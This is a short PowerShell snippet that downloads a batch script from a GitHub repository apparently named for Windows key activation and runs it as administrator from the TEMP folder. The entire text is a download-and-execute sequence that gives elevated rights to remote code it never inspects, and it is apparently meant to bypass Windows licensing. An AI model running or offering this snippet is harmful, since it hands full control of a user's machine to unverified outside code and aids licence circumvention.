$bat = "$env:TEMP\activate.bat"

irm https://raw.githubusercontent.com/anarchyste/Windows-Key-Activate/main/script.bat -OutFile $bat

Start-Process cmd.exe -ArgumentList "/c `"$bat`"" -Verb RunAs
